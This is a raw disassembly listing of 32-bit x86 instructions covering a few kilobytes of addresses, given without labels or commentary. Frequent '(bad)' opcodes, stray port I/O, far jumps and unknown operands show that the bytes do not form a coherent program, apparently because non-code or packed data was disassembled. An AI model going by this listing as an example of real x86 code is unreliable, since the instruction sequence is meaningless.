  41bbb8:	add    DWORD PTR [ebx+0x29],edi
  41bbbb:	cmc    
  41bbbc:	or     esp,DWORD PTR [esi]
  41bbbe:	fdiv   DWORD PTR ds:[edx*4+0x59faa57b]
  41bbc6:	dec    BYTE PTR [eax+0x56e25ba9]
  41bbcc:	adc    DWORD PTR [ecx],edi
  41bbce:	mov    edx,0x841e65a9
  41bbd3:	mov    dl,0xe7
  41bbd5:	ss dec eax
  41bbd7:	xchg   esi,eax
  41bbd8:	icebp  
  41bbd9:	repz cli 
  41bbdb:	cmc    
  41bbdc:	lock pop ecx
  41bbde:	stos   DWORD PTR es:[edi],eax
  41bbdf:	ror    BYTE PTR [ebx-0x515e311b],1
  41bbe5:	or     al,0x2
  41bbe7:	adc    dl,BYTE PTR cs:[edx+eax*4-0x1b]
  41bbec:	sbb    bl,BYTE PTR [eax]
  41bbee:	push   es
  41bbef:	fisttp QWORD PTR [ecx]
  41bbf1:	adc    al,0xdd
  41bbf3:	pop    es
  41bbf4:	sub    ah,BYTE PTR [ecx-0x45]
  41bbf7:	xchg   edx,eax
  41bbf8:	or     BYTE PTR [ecx],bh
  41bbfa:	sub    al,0x70
  41bbfc:	lds    edi,FWORD PTR [esi-0x44c44e0]
  41bc02:	xor    cl,dl
  41bc04:	fs retf 
  41bc06:	dec    ebp
  41bc07:	mov    dl,0x72
  41bc09:	mov    bl,0x6d
  41bc0b:	xor    eax,esp
  41bc0d:	mov    esp,DWORD PTR [ebp-0x53]
  41bc10:	cmp    eax,0x3a4b9db5
  41bc15:	test   eax,0x8bf49706
  41bc1a:	cmp    dl,BYTE PTR ds:0x9ac66a22
  41bc20:	mov    dl,0xcb
  41bc22:	scas   al,BYTE PTR es:[edi]
  41bc23:	xor    eax,DWORD PTR [ecx]
  41bc25:	call   0x2c984111
  41bc2a:	sbb    edi,DWORD PTR [esi+esi*2+0x39]
  41bc2e:	mov    fs,esi
  41bc30:	and    eax,0xecec3c11
  41bc35:	push   0x69
  41bc37:	mov    esp,DWORD PTR [ecx]
  41bc39:	retf   0xd268
  41bc3c:	or     al,0x4c
  41bc3e:	push   0xfd7a4f03
  41bc43:	iret   
  41bc44:	pop    es
  41bc45:	pop    ebx
  41bc46:	leave  
  41bc47:	xor    ebp,0x86c357ca
  41bc4d:	imul   esp,DWORD PTR [edi+ebx*8+0x44d5eee9],0xffffff87
  41bc55:	sub    dh,BYTE PTR [ebx+esi*2+0x35a70fa]
  41bc5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc5d:	add    eax,0x3ac5bfc6
  41bc62:	in     eax,dx
  41bc63:	sub    al,bh
  41bc65:	test   edx,ebx
  41bc67:	mov    edx,0x5b36fe27
  41bc6c:	scas   eax,DWORD PTR es:[edi]
  41bc6d:	jb     0x41bcc9
  41bc6f:	sbb    DWORD PTR [edx-0x37706d6b],edx
  41bc75:	mov    WORD PTR [edx-0x369f9c2e],?
  41bc7b:	mov    ah,0x1e
  41bc7d:	xchg   edx,eax
  41bc7e:	fisub  DWORD PTR [ebx+ebx*8-0x4bd01d2]
  41bc85:	jo     0x41bc2a
  41bc87:	adc    ebp,DWORD PTR [ecx+eax*1-0x1b7c8f67]
  41bc8e:	add    DWORD PTR [edi+0x7c],0x82211ebc
  41bc95:	lds    ebx,FWORD PTR [ecx+0x4f2f1115]
  41bc9b:	mov    DWORD PTR [edi-0x6e],eax
  41bc9e:	dec    edi
  41bc9f:	adc    BYTE PTR [esi+edx*2+0x563c9a5c],ah
  41bca6:	bound  ebp,QWORD PTR ds:0xde3f88cb
  41bcac:	pop    esp
  41bcad:	cmp    eax,0x586526ec
  41bcb2:	fidiv  DWORD PTR [esi+0x760f6f94]
  41bcb8:	repnz das 
  41bcba:	add    BYTE PTR [ecx-0x64c68738],cl
  41bcc0:	outs   dx,DWORD PTR ds:[esi]
  41bcc1:	outs   dx,DWORD PTR ds:[esi]
  41bcc2:	sub    ebx,DWORD PTR [eax-0x10abd1b9]
  41bcc8:	outs   dx,BYTE PTR ds:[esi]
  41bcc9:	push   eax
  41bcca:	nop
  41bccb:	cmp    ecx,esp
  41bccd:	mov    ecx,0xe6d0a94c
  41bcd2:	test   BYTE PTR [edx+0x74fc8030],ch
  41bcd8:	ret    
  41bcd9:	xchg   esp,eax
  41bcda:	aad    0xa1
  41bcdc:	mov    WORD PTR [edx],gs
  41bcde:	inc    ecx
  41bcdf:	outs   dx,DWORD PTR ds:[esi]
  41bce0:	lea    ebp,ds:0x45891311
  41bce6:	push   esp
  41bce7:	iret   
  41bce8:	pop    ds
  41bce9:	jge    0x41bce6
  41bceb:	push   0x65b28546
  41bcf0:	xchg   esi,eax
  41bcf1:	jmp    0xe868:0xa7a617d
  41bcf8:	add    eax,0xd8c59221
  41bcfd:	shl    DWORD PTR [edx+ebx*2+0xfd2529e],1
  41bd04:	das    
  41bd05:	and    eax,0x5f6c5142
  41bd0a:	les    ebx,FWORD PTR [ebp+0x24]
  41bd0d:	inc    ecx
  41bd0e:	mov    BYTE PTR [edi-0x25a445aa],cl
  41bd14:	shl    BYTE PTR [edx-0x29fb75e7],1
  41bd1a:	loop   0x41bcf5
  41bd1c:	xor    BYTE PTR [ecx+eax*1+0x37],bl
  41bd20:	pusha  
  41bd21:	shl    ah,0xb1
  41bd24:	ss pushf 
  41bd26:	rcl    DWORD PTR [ecx],1
  41bd28:	sub    al,0x35
  41bd2a:	stos   BYTE PTR es:[edi],al
  41bd2b:	add    DWORD PTR [edi],0x64887bcb
  41bd31:	retf   
  41bd32:	addr16 xor al,0x6f
  41bd35:	and    DWORD PTR [edi+0x23],0x54
  41bd39:	sti    
  41bd3a:	xor    ah,BYTE PTR [eax-0x3d09e5e9]
  41bd40:	adc    BYTE PTR [ecx],al
  41bd42:	out    0x76,eax
  41bd44:	push   cs
  41bd45:	bound  esi,QWORD PTR [ecx+0x2bd24ca]
  41bd4b:	xchg   BYTE PTR [esi-0x2373c645],ah
  41bd51:	shl    esi,cl
  41bd53:	cli    
  41bd54:	and    cl,BYTE PTR [ebp+0x28]
  41bd57:	mov    ebp,0xf9ac3e74
  41bd5c:	adc    al,0x26
  41bd5e:	pop    ecx
  41bd5f:	jae    0x41bced
  41bd61:	pop    esp
  41bd62:	pop    edx
  41bd63:	out    dx,eax
  41bd64:	ss jmp 0x41bd68
  41bd67:	ret    
  41bd68:	push   ebx
  41bd69:	xor    ebp,DWORD PTR [edi+0x2a1fcb9c]
  41bd6f:	xor    BYTE PTR [eax],0x22
  41bd72:	xchg   esi,eax
  41bd73:	sub    DWORD PTR [ebp-0x41fd1805],ebp
  41bd79:	or     DWORD PTR [edi],eax
  41bd7b:	jae    0x41bda6
  41bd7d:	xchg   edx,eax
  41bd7e:	mov    dh,0x8
  41bd80:	jp     0x41bdd3
  41bd82:	ss sbb al,0xc6
  41bd85:	dec    esp
  41bd86:	stc    
  41bd87:	fidiv  WORD PTR [esi+0x2ebc18b5]
  41bd8d:	sub    BYTE PTR [eax-0x80],ah
  41bd90:	popf   
  41bd91:	sbb    al,0xef
  41bd93:	xchg   BYTE PTR [edi+0x4d],al
  41bd96:	aad    0x37
  41bd98:	jno    0x41bd79
  41bd9a:	test   ah,cl
  41bd9c:	clc    
  41bd9d:	fucomip st,st(3)
  41bd9f:	xchg   BYTE PTR [esi-0x7c],al
  41bda2:	cmp    BYTE PTR [edx],ah
  41bda4:	jns    0x41bdbd
  41bda6:	test   eax,0x37874ebc
  41bdab:	xor    ecx,DWORD PTR [esi]
  41bdad:	xchg   edi,eax
  41bdae:	sbb    DWORD PTR [edi],esi
  41bdb0:	or     ecx,DWORD PTR [edx+0x65]
  41bdb3:	xchg   edi,eax
  41bdb4:	cmp    edx,esp
  41bdb6:	enter  0xb6eb,0x1d
  41bdba:	sbb    cl,bl
  41bdbc:	xor    dl,BYTE PTR [esp+esi*8-0x793c6a79]
  41bdc3:	jae    0x41bdf2
  41bdc5:	adc    eax,0x772df538
  41bdca:	sub    DWORD PTR [edi-0x19],0x26
  41bdce:	pop    ebx
  41bdcf:	push   ss
  41bdd0:	adc    esi,ecx
  41bdd2:	mov    bl,BYTE PTR [esi+0x21]
  41bdd5:	out    dx,eax
  41bdd6:	sbb    eax,0x42e344c6
  41bddb:	push   ecx
  41bddc:	nop
  41bddd:	jg     0x41be3b
  41bddf:	push   ebp
  41bde0:	mov    bl,0x2
  41bde2:	sbb    eax,0x96bed9ca
  41bde7:	cli    
  41bde8:	adc    eax,0x872b2acd
  41bded:	test   al,0x6d
  41bdef:	mov    ebx,0x1b82707e
  41bdf4:	dec    esi
  41bdf5:	enter  0xdf96,0xcd
  41bdf9:	pop    ebx
  41bdfa:	jmp    0xd0c9:0x194ccbb3
  41be01:	push   esi
  41be02:	(bad)  
  41be03:	repnz sar cl,0x33
  41be07:	xchg   BYTE PTR [edi-0x58],ch
  41be0a:	in     eax,0x7
  41be0c:	scas   eax,DWORD PTR es:[edi]
  41be0d:	cmc    
  41be0e:	out    0x18,al
  41be10:	pop    es
  41be11:	stos   BYTE PTR es:[edi],al
  41be12:	mov    al,0x8e
  41be14:	fs mov edx,0xfa0851b9
  41be1a:	mov    ecx,0x506fd4d0
  41be1f:	daa    
  41be20:	jecxz  0x41be0f
  41be22:	out    dx,al
  41be23:	bound  esp,QWORD PTR [ecx+eax*8-0xd935a27]
  41be2a:	sub    DWORD PTR es:[esi+0x24],eax
  41be2e:	xor    eax,0x3cb75664
  41be33:	adc    al,0xef
  41be35:	outs   dx,DWORD PTR ds:[esi]
  41be36:	dec    ecx
  41be37:	mov    edi,DWORD PTR fs:[edx]
  41be3a:	mov    dl,0x65
  41be3c:	mov    edi,0x7811c6f4
  41be41:	sahf   
  41be42:	mov    ds:0xacd1522e,eax
  41be47:	out    0x7e,al
  41be49:	call   0xcbde:0x6c779b6d
  41be50:	js     0x41be9a
  41be52:	add    BYTE PTR ds:0x8d1e0f18,0xf
  41be59:	or     ebx,edx
  41be5b:	mov    ah,BYTE PTR ds:[ebp+0x4682de43]
  41be62:	mov    esp,0x1afe813b
  41be68:	or     al,0xe3
  41be6a:	sbb    DWORD PTR [ebx-0xa67ff35],0xffffffbd
  41be71:	popw   es
  41be73:	clc    
  41be74:	or     eax,DWORD PTR [ebp+0x5ae45850]
  41be7a:	sub    BYTE PTR [edx],dh
  41be7c:	xchg   edi,eax
  41be7d:	mov    al,0x78
  41be7f:	loop   0x41be99
  41be81:	push   ebp
  41be82:	in     al,dx
  41be83:	mov    ecx,0xce081ef2
  41be88:	(bad)  
  41be89:	mov    ch,0x66
  41be8b:	outs   dx,DWORD PTR ds:[esi]
  41be8c:	or     DWORD PTR [ecx-0x53],ecx
  41be8f:	adc    bl,BYTE PTR gs:[edi+0x1a8c7062]
  41be96:	enter  0xbf64,0xca
  41be9a:	enter  0xe8eb,0x8
  41be9e:	imul   ah
  41bea0:	mov    esp,0x355b5c09
  41bea5:	xchg   esp,eax
  41bea6:	shr    ch,1
  41bea8:	inc    ebp
  41bea9:	fisttp WORD PTR [ebx+0x6f]
  41beac:	inc    edi
  41bead:	push   ds
  41beae:	xchg   esp,eax
  41beaf:	or     ebx,DWORD PTR [edi]
  41beb1:	ror    DWORD PTR [ecx-0x5f],0x1a
  41beb5:	test   BYTE PTR [ebx+edi*2-0xfe5d49a],0x68
  41bebd:	ins    BYTE PTR es:[edi],dx
  41bebe:	popf   
  41bebf:	test   DWORD PTR [edx-0x10],eax
  41bec2:	xor    al,0x90
  41bec4:	les    esp,FWORD PTR ds:0xae441c40
  41beca:	push   ecx
  41becb:	(bad)
  41bece:	(bad)  
  41becf:	jb     0x41be5c
  41bed1:	inc    ebp
  41bed2:	jbe    0x41be62
  41bed4:	xor    eax,0xb882570b
  41bed9:	inc    eax
  41beda:	pop    esp
  41bedb:	sar    esi,1
  41bedd:	mov    WORD PTR [esi-0x67],?
  41bee0:	gs dec eax
  41bee2:	and    ch,BYTE PTR [ebx+0x77612dde]
  41bee8:	out    dx,al
  41bee9:	cmp    BYTE PTR ds:0x73781856,dh
  41beef:	pop    ecx
  41bef0:	cmc    
  41bef1:	push   0xce6d4396
  41bef6:	ret    0xacb4
  41bef9:	pop    esi
  41befa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41befb:	fdiv   QWORD PTR [ecx]
  41befd:	stos   DWORD PTR es:[edi],eax
  41befe:	aaa    
  41beff:	and    DWORD PTR [edi+0x1d],edx
  41bf02:	idiv   DWORD PTR [eax+0x1810f48c]
  41bf08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf09:	clc    
  41bf0a:	mov    ds:0xa14fb983,eax
  41bf0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf10:	(bad)  
  41bf11:	std    
  41bf12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf13:	inc    eax
  41bf14:	add    DWORD PTR [ebx+0x3d4bcea1],0xffffff98
  41bf1b:	sbb    DWORD PTR [eax],eax
  41bf1d:	ret    0xdd32
  41bf20:	rcl    DWORD PTR [ecx+ebx*1],1
  41bf23:	push   cs
  41bf24:	js     0x41bef4
  41bf26:	xchg   ebx,eax
  41bf27:	inc    eax
  41bf28:	jno    0x41bf74
  41bf2a:	cs xchg al,ch
  41bf2d:	add    eax,DWORD PTR [edx+0x51]
  41bf30:	xchg   ecx,eax
  41bf31:	pushf  
  41bf32:	cld    
  41bf33:	jg     0x41bf12
  41bf35:	(bad)  
  41bf36:	sbb    ah,BYTE PTR [eax-0x30]
  41bf39:	xchg   edi,eax
  41bf3a:	shr    BYTE PTR [esi-0x690649c1],cl
  41bf40:	fiadd  WORD PTR [ecx+0x49e8b1ef]
  41bf46:	bound  esp,QWORD PTR [ecx-0x4f]
  41bf49:	scas   al,BYTE PTR es:[edi]
  41bf4a:	enter  0xd613,0x54
  41bf4e:	sar    BYTE PTR [edx+0xc],0x7e
  41bf52:	cmp    eax,0xd47a4a85
  41bf57:	retf   0x8fbd
  41bf5a:	mov    ah,0xe0
  41bf5c:	ja     0x41bf8c
  41bf5e:	(bad)  
  41bf5f:	xor    edi,DWORD PTR [edx]
  41bf61:	shl    BYTE PTR [ebx+0x762d46ee],cl
  41bf67:	and    esi,edi
  41bf69:	rcr    DWORD PTR [edx+edx*4+0x536983b7],0x1d
  41bf71:	jno    0x41bf19
  41bf73:	out    0x72,eax
  41bf75:	mov    bl,0x6e
  41bf77:	adc    eax,0x9b5e309b
  41bf7c:	and    al,0x75
  41bf7e:	outs   dx,BYTE PTR ds:[esi]
  41bf7f:	jle    0x41bf2f
  41bf81:	aam    0xd1
  41bf83:	int3   
  41bf84:	dec    edi
  41bf85:	popf   
  41bf86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf87:	aas    
  41bf88:	pop    esi
  41bf89:	add    eax,0xa97ecaae
  41bf8e:	xor    edx,DWORD PTR [edx]
  41bf90:	imul   eax,DWORD PTR [esi-0x3e986822],0xcece220c
  41bf9a:	lods   al,BYTE PTR ds:[esi]
  41bf9b:	mov    BYTE PTR [ecx],ch
  41bf9d:	or     eax,0xa67b2ba7
  41bfa2:	cdq    
  41bfa3:	inc    edx
  41bfa4:	fldcw  WORD PTR [ebx-0x4e233129]
  41bfaa:	adc    BYTE PTR [edx],dh
  41bfac:	gs push ebp
  41bfae:	or     DWORD PTR [esi+0x5d],0xce19eab9
  41bfb5:	sbb    al,0x67
  41bfb7:	stos   DWORD PTR es:[edi],eax
  41bfb8:	js     0x41bf98
  41bfba:	jl     0x41bf58
  41bfbc:	test   eax,0xea8652fb
  41bfc1:	adc    al,0xa1
  41bfc3:	dec    ebx
  41bfc4:	retf   0xc777
  41bfc7:	pop    ss
  41bfc8:	jmp    0x5fd8e0ed
  41bfcd:	sub    eax,0xd8dc132b
  41bfd2:	mov    ch,0x11
  41bfd4:	jmp    0x41bf83
  41bfd6:	loopne 0x41bff0
  41bfd8:	jmp    0x7fb7feea
  41bfdd:	mov    edx,0x78c46d8a
  41bfe2:	daa    
  41bfe3:	xor    al,0x94
  41bfe5:	sbb    esi,DWORD PTR [eax+edi*2]
  41bfe8:	fnstsw WORD PTR [ecx-0x3c]
  41bfeb:	sar    BYTE PTR [edi+0x22fcb5ad],cl
  41bff1:	xchg   BYTE PTR [ebp+0x43e92329],bh
  41bff7:	jo     0x41bfdb
  41bff9:	in     al,dx
  41bffa:	call   0xfc15:0x711a4733
  41c001:	outs   dx,DWORD PTR ds:[esi]
  41c002:	in     al,dx
  41c003:	or     dl,BYTE PTR [edi+0x6ac54c22]
  41c009:	je     0x41bfb0
  41c00b:	inc    edi
  41c00c:	xor    DWORD PTR [esi],eax
  41c00e:	mov    cl,0x12
  41c010:	into   
  41c011:	and    eax,0x503cbbf7
  41c016:	mov    eax,ds:0x1ebb25bf
  41c01b:	push   0xffffff8b
  41c01d:	aad    0x70
  41c01f:	cmp    ecx,DWORD PTR [ebx]
  41c021:	sbb    esi,edi
  41c023:	mov    bh,0xd
  41c025:	repz inc esp
  41c027:	mov    edi,0x25ca2bfa
  41c02c:	xor    al,0x18
  41c02e:	rcr    BYTE PTR [ebp-0x27],0xf8
  41c032:	mov    esi,0x65e7aa09
  41c037:	int3   
  41c038:	pop    edi
  41c039:	jo     0x41c0ae
  41c03b:	scas   al,BYTE PTR es:[edi]
  41c03c:	mov    ebx,0x5eae2154
  41c041:	es or  ebx,ecx
  41c044:	test   al,0x4d
  41c046:	xor    eax,0x417085f0
  41c04b:	enter  0xd6e4,0x9e
  41c04f:	das    
  41c050:	ins    DWORD PTR es:[edi],dx
  41c051:	sub    BYTE PTR [ebp-0x5f],0x12
  41c055:	pop    ds
  41c056:	int    0x41
  41c058:	retf   0x620e
  41c05b:	mov    ebp,0x7c3cfc61
  41c060:	xor    esp,ebx
  41c062:	xchg   esi,eax
  41c063:	daa    
  41c064:	xlat   BYTE PTR ds:[ebx]
  41c065:	mov    dl,0x25
  41c067:	retf   
  41c068:	mov    DWORD PTR [esi-0x4569fd8b],esp
  41c06e:	xor    eax,0x1cc905f5
  41c073:	fsub   DWORD PTR [edx+esi*1]
  41c076:	imul   edi,ebp,0x4a59288d
  41c07c:	push   edi
  41c07d:	not    BYTE PTR [eax-0x6b09c983]
  41c083:	sbb    eax,0x3bdb5c50
  41c088:	sbb    al,BYTE PTR [ecx]
  41c08a:	cs push 0x6b
  41c08d:	rol    DWORD PTR [esi+0x1f],0x41
  41c091:	dec    ecx
  41c092:	mov    esi,DWORD PTR [ebx+0x36]
  41c095:	fsubr  DWORD PTR [ebx]
  41c097:	fs icebp 
  41c099:	(bad)  
  41c09a:	lahf   
  41c09b:	addr16 mov ?,edx
  41c09e:	jge    0x41c0c1
  41c0a0:	pop    esi
  41c0a1:	inc    edi
  41c0a2:	test   BYTE PTR [eax+0x3ca2356a],al
  41c0a8:	xor    al,0x53
  41c0aa:	inc    edi
  41c0ab:	adc    edx,edi
  41c0ad:	or     DWORD PTR [eax],esi
  41c0af:	dec    DWORD PTR [edx-0x1b]
  41c0b2:	dec    eax
  41c0b3:	(bad)  
  41c0b4:	lock push eax
  41c0b6:	stos   DWORD PTR es:[edi],eax
  41c0b7:	push   ebp
  41c0b8:	aas    
  41c0b9:	jae    0x41c097
  41c0bb:	add    eax,0x39837754
  41c0c0:	xor    eax,0xe92c9693
  41c0c5:	call   0xf0e13ae
  41c0ca:	loop   0x41c09a
  41c0cc:	jbe    0x41c107
  41c0ce:	in     eax,dx
  41c0cf:	xchg   DWORD PTR [edi-0x31a20202],edx
  41c0d5:	xchg   DWORD PTR [esi-0x26],esp
  41c0d8:	adc    DWORD PTR [ecx+0x32],ecx
  41c0db:	xor    DWORD PTR [ebx+ebx*8],eax
  41c0de:	sub    eax,0x8ee13f8e
  41c0e3:	retf   0xaf35
  41c0e6:	test   DWORD PTR [ebp+edi*4+0xc],ebp
  41c0ea:	ret    
  41c0eb:	and    al,0xad
  41c0ed:	ror    ah,0xed
  41c0f0:	adc    BYTE PTR [edi-0x67],ah
  41c0f3:	das    
  41c0f4:	mov    ds:0xf0f3afec,eax
  41c0f9:	(bad)  
  41c0fa:	(bad)  
  41c0fc:	jmp    0x41c0e7
  41c0fe:	(bad)  
  41c0ff:	sbb    BYTE PTR [ebp-0x3ad37e6a],bl
  41c105:	fadd   st,st(5)
  41c107:	cmp    esp,edx
  41c109:	dec    ebp
  41c10a:	ror    edi,0xa2
  41c10d:	xchg   edx,eax
  41c10e:	aas    
  41c10f:	sar    dl,cl
  41c111:	and    bl,BYTE PTR [edi-0xbaa60dd]
  41c117:	jnp    0x41c099
  41c119:	jb     0x41c0ba
  41c11b:	aaa    
  41c11c:	sub    ch,BYTE PTR [eax+0x10]
  41c11f:	loopne 0x41c118
  41c121:	jecxz  0x41c119
  41c123:	enter  0xd375,0x6d
  41c127:	mov    ch,0xb9
  41c129:	push   es
  41c12a:	push   cs
  41c12b:	out    dx,eax
  41c12c:	pop    edi
  41c12d:	retfw  
  41c12f:	stos   BYTE PTR es:[edi],al
  41c130:	out    0xb3,al
  41c132:	pop    ebp
  41c133:	and    eax,0xff32ba32
  41c138:	imul   esi,DWORD PTR [edx+edi*8+0x132e7063],0x62b6452d
  41c143:	test   al,0x7e
  41c145:	dec    edi
  41c146:	ds dec ebx
  41c148:	push   ss
  41c149:	push   eax
  41c14a:	nop
  41c14b:	mov    BYTE PTR [esi-0x76],ah
  41c14e:	adc    ebx,DWORD PTR [ecx-0x6d]
  41c151:	sub    dh,BYTE PTR [ebx+0x64]
  41c154:	mov    esi,0x5ad9815
  41c159:	mov    esp,0xbe305bdd
  41c15e:	jne    0x41c175
  41c160:	jbe    0x41c0ee
  41c162:	retf   0x9a6b
  41c165:	xchg   edx,eax
  41c166:	(bad)  
  41c167:	and    DWORD PTR [ecx+0x3a3219ec],ecx
  41c16d:	es add eax,0x339a31db
  41c173:	scas   eax,DWORD PTR es:[edi]
  41c174:	lock inc esi
  41c176:	ficomp WORD PTR [ebx]
  41c178:	test   DWORD PTR [edi],esp
  41c17a:	out    0xce,al
  41c17c:	mov    ds:0xc75b6198,eax
  41c181:	inc    esi
  41c182:	push   ebx
  41c183:	aas    
  41c184:	push   0x2
  41c186:	mov    ?,WORD PTR [eax]
  41c188:	loope  0x41c126
  41c18a:	push   es
  41c18b:	dec    ebp
  41c18c:	shr    BYTE PTR [ecx],1
  41c18e:	js     0x41c1ab
  41c190:	scas   al,BYTE PTR es:[edi]
  41c191:	push   ebp
  41c192:	dec    ebx
  41c193:	je     0x41c115
  41c195:	iret   
  41c196:	or     ah,bl
  41c198:	inc    ebx
  41c199:	stos   DWORD PTR es:[edi],eax
  41c19a:	imul   edi,DWORD PTR [ebx],0xffffffee
  41c19d:	adc    DWORD PTR [ebp-0x70],0x1e
  41c1a1:	sub    al,0xfd
  41c1a3:	add    eax,0xa0eb19bc
  41c1a8:	lds    edi,FWORD PTR [eax+0x54a3598b]
  41c1ae:	xlat   BYTE PTR ds:[ebx]
  41c1af:	mov    cl,0x54
  41c1b1:	xor    al,ch
  41c1b3:	jge    0x41c1a3
  41c1b5:	and    al,0xd5
  41c1b7:	push   es
  41c1b8:	dec    ecx
  41c1b9:	clc    
  41c1ba:	push   ecx
  41c1bb:	int    0x3e
  41c1bd:	lods   eax,DWORD PTR ds:[esi]
  41c1be:	(bad)  
  41c1bf:	sbb    BYTE PTR [ebx-0x70],al
  41c1c2:	mov    ah,0xec
  41c1c4:	push   ds
  41c1c5:	sti    
  41c1c6:	popa   
  41c1c7:	lods   eax,DWORD PTR ds:[esi]
  41c1c8:	and    ah,bl
  41c1ca:	jecxz  0x41c22b
  41c1cc:	mov    bl,0x6b
  41c1ce:	icebp  
  41c1cf:	mov    ds:0x44d40649,eax
  41c1d4:	jl     0x41c22e
  41c1d6:	xchg   esp,eax
  41c1d7:	pop    esp
  41c1d8:	and    eax,DWORD PTR [ebx-0x463ddf6]
  41c1de:	sub    DWORD PTR gs:[ecx+0x2686e30d],ecx
  41c1e5:	sahf   
  41c1e6:	dec    esi
  41c1e7:	mov    al,ds:0x3780f917
  41c1ec:	cmp    dl,BYTE PTR [edx+0x7f]
  41c1ef:	ins    BYTE PTR es:[edi],dx
  41c1f0:	fist   WORD PTR [ecx]
  41c1f2:	mov    edi,0x8cdcaedb
  41c1f7:	ss jb  0x41c239
  41c1fa:	daa    
  41c1fb:	(bad)  
  41c1fc:	ja     0x41c276
  41c1fe:	fisttp DWORD PTR [eax+0x24]
  41c201:	jl     0x41c1fc
  41c203:	cdq    
  41c204:	cmp    ch,al
  41c206:	repnz or ecx,DWORD PTR [ecx]
  41c209:	scas   eax,DWORD PTR es:[edi]
  41c20a:	in     al,dx
  41c20b:	add    BYTE PTR fs:[edi-0x459e4b36],0xf6
  41c213:	xchg   ecx,eax
  41c214:	xchg   edi,eax
  41c215:	fisubr DWORD PTR [ebx-0x50]
  41c218:	in     al,dx
  41c219:	add    DWORD PTR [eax+0x21e3a2b1],ebx
  41c21f:	add    eax,0xca54df44
  41c224:	or     eax,0xb4eb453e
  41c229:	mov    bh,0x63
  41c22b:	shl    BYTE PTR [ebx-0x236cef7e],cl
  41c231:	mov    esp,0xf846373
  41c236:	in     eax,dx
  41c237:	jge    0x41c2a9
  41c239:	push   ds
  41c23a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c23b:	mov    ds:0x8ce2d293,eax
  41c240:	mov    edx,0x3bf9990
  41c245:	iret   
  41c246:	aas    
  41c247:	(bad)  
  41c249:	ror    BYTE PTR [eax-0x1634f062],1
  41c24f:	and    BYTE PTR [ebx],bh
  41c251:	loopne 0x41c1f2
  41c253:	xor    DWORD PTR [ebp-0x29],ecx
  41c256:	push   ecx
  41c257:	and    cl,BYTE PTR [edi+0x3d]
  41c25a:	jg     0x41c246
  41c25c:	and    al,0xaa
  41c25e:	loopne 0x41c225
  41c260:	and    al,0x4
  41c262:	mov    ebx,0x6647cc1d
  41c267:	pop    esi
  41c268:	sub    edx,DWORD PTR [edx+0x31ea7fe9]
  41c26e:	dec    esi
  41c26f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c270:	inc    eax
  41c271:	icebp  
  41c272:	mov    cl,0xe2
  41c274:	(bad)  
  41c276:	mov    bh,0x2b
  41c278:	pop    es
  41c279:	push   esi
  41c27a:	mov    DWORD PTR ds:0x88b45525,eax
  41c280:	retf   
  41c281:	push   ebx
  41c282:	mov    al,ds:0x4b4aff78
  41c287:	fmul   st,st(7)
  41c289:	ret    
  41c28a:	dec    edi
  41c28b:	cdq    
  41c28c:	les    ebx,FWORD PTR [esi-0x7e96d0a6]
  41c292:	in     al,0xe
  41c294:	and    al,BYTE PTR [esi+0x38]
  41c297:	push   es
  41c298:	adc    ebp,DWORD PTR [edi]
  41c29a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c29b:	test   eax,0xd34a5e1
  41c2a0:	out    0xd0,al
  41c2a2:	jmp    0xed68949b
  41c2a7:	(bad)  
  41c2a8:	sbb    eax,0xb16cb731
  41c2ad:	rol    ecx,0x25
  41c2b0:	daa    
  41c2b1:	loope  0x41c2dd
  41c2b3:	dec    edi
  41c2b4:	push   0x35f04b4f
  41c2b9:	mov    WORD PTR [edi-0x7a701c53],ss
  41c2bf:	mov    ah,0x63
  41c2c1:	sbb    DWORD PTR [esi+0x29bbdbcd],ebx
  41c2c7:	add    ah,BYTE PTR [eax-0x5d020eca]
  41c2cd:	lds    ebx,FWORD PTR [edx]
  41c2cf:	stos   BYTE PTR es:[edi],al
  41c2d0:	in     al,dx
  41c2d1:	in     eax,dx
  41c2d2:	inc    edi
  41c2d3:	jmp    0x28ba4f7b
  41c2d8:	sub    ecx,ecx
  41c2da:	xlat   BYTE PTR cs:[ebx]
  41c2dc:	leave  
  41c2dd:	pusha  
  41c2de:	sub    al,0x82
  41c2e0:	nop
  41c2e1:	sbb    bl,BYTE PTR [eax+0x38a74092]
  41c2e7:	shld   DWORD PTR [esi],esp,cl
  41c2ea:	aas    
  41c2eb:	sub    BYTE PTR [ebx-0x7967be12],bl
  41c2f1:	aas    
  41c2f2:	mov    cl,0x57
  41c2f4:	xchg   esi,eax
  41c2f5:	(bad)  
  41c2f6:	fdiv   QWORD PTR [esi+eiz*4]
  41c2f9:	dec    esp
  41c2fa:	lds    eax,FWORD PTR [esi]
  41c2fc:	dec    ecx
  41c2fd:	scas   al,BYTE PTR es:[edi]
  41c2fe:	iretw  
  41c300:	inc    ebx
  41c301:	lds    eax,FWORD PTR [ebp-0x233ed0ca]
  41c307:	jb     0x41c2a9
  41c309:	pop    eax
  41c30a:	sub    dh,cl
  41c30c:	fbld   TBYTE PTR [edi+0xe]
  41c30f:	sti    
  41c310:	dec    eax
  41c311:	mov    WORD PTR [edx+eiz*8+0x32],ss
  41c315:	mov    esi,0x24d6742c
  41c31a:	out    0xcb,al
  41c31c:	add    ebp,DWORD PTR [eax]
  41c31e:	iret   
  41c31f:	add    DWORD PTR [esi+eiz*1-0x2597a432],0x53f963f1
  41c32a:	in     eax,dx
  41c32b:	mov    esp,0x6da0ab69
  41c330:	pop    eax
  41c331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c332:	(bad)  
  41c333:	pop    esp
  41c334:	daa    
  41c335:	fwait
  41c336:	stos   BYTE PTR es:[edi],al
  41c337:	sbb    eax,0x2659626f
  41c33c:	es imul ebp,ecx,0xc9d57ce9
  41c343:	(bad)  
  41c344:	out    0xae,al
  41c346:	and    al,0x44
  41c348:	push   ds
  41c349:	std    
  41c34a:	int3   
  41c34b:	cmp    DWORD PTR [esi],edi
  41c34d:	xor    al,0x87
  41c34f:	aam    0x2a
  41c351:	mov    eax,ds:0xe39b1ea7
